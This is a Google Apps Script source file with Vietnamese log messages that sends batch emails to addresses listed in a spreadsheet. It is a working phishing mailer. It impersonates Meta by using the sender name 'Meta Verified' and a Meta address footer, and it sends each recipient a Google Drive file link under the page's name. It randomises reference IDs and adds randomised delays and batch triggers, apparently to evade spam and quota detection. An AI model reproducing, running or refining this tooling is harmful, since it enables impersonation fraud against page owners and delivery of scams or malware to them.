const CONFIG = {
  FORM_URL: "https://drive.google.com/file/d/1zMXjO2Ey1loY_BBEae4bu4KKI1q00Q9j/view",
  SPREADSHEET_URL: "[LINK_SHEET]",
  SHEET_NAME: "Sheet1",
  SENDER_NAME: "Meta Verified",
  WEBSITE: "https://www.facebook.com",
  PHYSICAL_ADDRESS: "1 Meta Way, Menlo Park, CA 94025",
  BATCH_LIMIT: 3,
  REST_MIN: 2,
  REST_MAX: 4,
  MIN_SLEEP: 25000,
  MAX_SLEEP: 70000,
  MAX_EXECUTION_TIME: 280000,
  QUOTA_RESERVE: 10,
  MAX_RETRY: 2,
  LOCK_TIMEOUT: 30000
};

function shareSingleFormToList(e) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(CONFIG.LOCK_TIMEOUT)) {
    Logger.log("🔒 Script đang chạy ở instance khác");
    return;
  }

  try {
    _mainLogic(e);
  } catch (err) {
    Logger.log("🔥 Lỗi tổng: " + err.message);
  } finally {
    lock.releaseLock();
  }
}

function _mainLogic(e) {
  const startTime = Date.now();
  const props = PropertiesService.getScriptProperties();
  const userEmail = getEffectiveUserEmail();

  const quota = MailApp.getRemainingDailyQuota();
  Logger.log("📊 Quota còn: " + quota); // log quota
  if (quota <= CONFIG.QUOTA_RESERVE) {
    Logger.log("⚠️ Không đủ quota");
    return;
  }

  if (e === undefined) {
    props.deleteProperty("LAST_SENT_ROW");
  }

  const ss = SpreadsheetApp.openById(extractSpreadsheetId(CONFIG.SPREADSHEET_URL));
  const sheet = ss.getSheetByName(CONFIG.SHEET_NAME);

  if (!sheet) throw new Error("❌ Sheet không tồn tại");

  const startRow = Number(props.getProperty("LAST_SENT_ROW")) || 2;
  const lastRow = sheet.getLastRow();

  if (startRow > lastRow) {
    props.deleteProperty("LAST_SENT_ROW");
    Logger.log("🎉 Hoàn tất toàn bộ");
    return;
  }

  const rowsToProcess = Math.min(
    CONFIG.BATCH_LIMIT,
    lastRow - startRow + 1,
    quota - CONFIG.QUOTA_RESERVE
  );

  const data = sheet.getRange(startRow, 1, rowsToProcess, 7).getValues();
  const output = [];

  const sentCache = new Set();
  let processed = 0;

  for (let i = 0; i < data.length; i++) {

    if (Date.now() - startTime > CONFIG.MAX_EXECUTION_TIME) break;

    if (MailApp.getRemainingDailyQuota() <= CONFIG.QUOTA_RESERVE) {
      Logger.log("⚠️ Hết quota giữa chừng");
      break;
    }

    const email = String(data[i][0]).trim();
    const pageName = String(data[i][1]).trim();
    let subject = String(data[i][2]).trim();
    let intro = String(data[i][3]).trim();
    let linkText = String(data[i][4]).trim();
    const status = String(data[i][5]).trim();
    const oldTime = data[i][6];

    if (status === "✅ Sent") {
      output.push([status, oldTime]);
      processed++;
      continue;
    }

    if (!isValidEmail(email) || !pageName) {
      output.push(["🚫 Invalid Data", new Date()]);
      processed++;
      continue;
    }

    if (sentCache.has(email)) {
      output.push(["⚠️ Duplicate", new Date()]);
      processed++;
      continue;
    }
    sentCache.add(email);

    subject = subject.replace(/\[Name\]/g, pageName);
    intro = intro.replace(/\[Name\]/g, pageName).replace(/\\n/g, "\n");
    linkText = linkText.replace(/\[Name\]/g, pageName).replace(/\\n/g, "\n");

    const refId = generateRefId(4);

    const finalSubject = "[" + refId + "] " + subject;

      const footer =
`------------------------
🌐 ${CONFIG.WEBSITE}
📍 ${CONFIG.PHYSICAL_ADDRESS}`;

    const fullMessage =
`${intro}

${linkText} ${CONFIG.FORM_URL}

Gracias por ser parte de la comunidad de Meta.

${footer}`;

    const htmlMessage = fullMessage.replace(/\n/g, "<br>");
    let success = false;
    let errorMsg = "";

    Logger.log(`📤 Sending to row ${startRow + i} | ${email} | ${pageName}`);

    for (let attempt = 1; attempt <= CONFIG.MAX_RETRY; attempt++) {
      try {
        MailApp.sendEmail({
          to: email,
          subject: finalSubject,
          body: fullMessage,
          htmlBody: htmlMessage,
          name: CONFIG.SENDER_NAME,
          replyTo: userEmail
        });
        success = true;
        break;
      } catch (err) {
        errorMsg = err.message;
        Logger.log(`❌ Attempt ${attempt}: ${email} | ${errorMsg}`);
        Utilities.sleep(5000);
      }
    }

    if (success) {
      output.push(["✅ Sent", new Date()]);
    } else {
      output.push(["❌ " + errorMsg, new Date()]);
    }

    const sleepTime =
      Math.floor(Math.random() * (CONFIG.MAX_SLEEP - CONFIG.MIN_SLEEP + 1)) +
      CONFIG.MIN_SLEEP;
    Logger.log(`😴 Sleep ${Math.round(sleepTime / 1000)}s trước email tiếp theo`);
    Utilities.sleep(sleepTime);

    processed++;
  }

  if (output.length > 0) {
    sheet.getRange(startRow, 6, output.length, 2).setValues(output);
  }

  const nextRow = startRow + processed;

  if (nextRow <= lastRow) {
    props.setProperty("LAST_SENT_ROW", nextRow.toString());

    deleteTriggers("shareSingleFormToList");

    const restMinutes = Math.floor(Math.random() * (CONFIG.REST_MAX - CONFIG.REST_MIN + 1)) + CONFIG.REST_MIN;

    ScriptApp.newTrigger("shareSingleFormToList")
      .timeBased()
      .after(restMinutes * 60 * 1000)
      .create();

    Logger.log(`⏳ Batch xong. Trigger tiếp theo sau ${restMinutes} phút. Row tiếp: ${nextRow}`);
  } else {
    props.deleteProperty("LAST_SENT_ROW");
    deleteTriggers("shareSingleFormToList");
    Logger.log("🎉 DONE toàn bộ");
  }
}

function getEffectiveUserEmail() {
  try {
    const email = Session.getActiveUser().getEmail();
    if (email) return email;
  } catch (e) {}
  return "fallback@gmail.com";
}

function extractSpreadsheetId(url) {
  const match = url.match(/\/d\/([a-zA-Z0-9_-]+)/);
  if (!match) throw new Error("❌ Invalid Spreadsheet URL");
  return match[1];
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function deleteTriggers(fn) {
  ScriptApp.getProjectTriggers().forEach(t => {
    if (t.getHandlerFunction() === fn) {
      ScriptApp.deleteTrigger(t);
    }
  });
}

function generateNumericId(length) {
  let result = "";
  const digits = "0123456789";
  for (let i = 0; i < length; i++) {
    result += digits[Math.floor(Math.random() * digits.length)];
  }
  return result;
}

function generateRefId(length = 4) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}
